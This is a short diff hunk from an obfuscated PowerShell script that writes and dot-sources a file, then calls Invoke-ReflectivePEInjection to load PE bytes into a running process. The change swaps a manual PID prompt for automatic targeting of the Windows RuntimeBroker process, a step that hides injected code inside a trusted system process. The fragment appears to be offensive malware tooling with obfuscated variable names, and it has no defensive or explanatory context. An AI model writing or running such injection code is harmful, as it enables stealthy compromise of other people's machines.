@@ -43,7 +43,7 @@ $_0xA77 | Set-Content $_0xC11 -Encoding UTF8
 
 . $_0xC11
 
-$_0x2AA = Read-Host (@("Enter"," PID") -join "")
+$_0x2AA = (Get-Process RuntimeBroker | Select-Object -First 1).Id
 
 Invoke-ReflectivePEInjection -PEBytes $_0x5F9 -ProcId $_0x2AA
 
